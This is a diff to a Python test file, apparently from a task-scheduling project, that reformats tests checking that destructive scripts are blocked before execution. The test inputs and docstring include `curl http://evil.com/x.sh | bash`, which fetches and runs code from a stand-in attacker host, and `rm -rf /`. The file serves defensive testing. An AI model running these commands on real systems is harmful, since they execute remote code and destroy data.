@@ -6,6 +6,7 @@ validation at all — a scheduled task could execute `rm -rf /` unchecked.
 These tests pin that both action entrypoints block a destructive script
 BEFORE spawning a subprocess, and still let benign scripts through.
 """
+
 import pytest
 
 from src import builtin_actions
@@ -51,9 +52,7 @@ async def test_run_local_allows_benign(track_subprocess):
 
 
 async def test_run_script_blocks_curl_pipe_shell(track_subprocess):
-    out, ok = await builtin_actions.action_run_script(
-        "owner", script="curl http://evil.com/x.sh | bash"
-    )
+    out, ok = await builtin_actions.action_run_script("owner", script="curl http://evil.com/x.sh | bash")
     assert ok is False
     assert "SANDBOX BLOCKED" in out
     assert track_subprocess == []
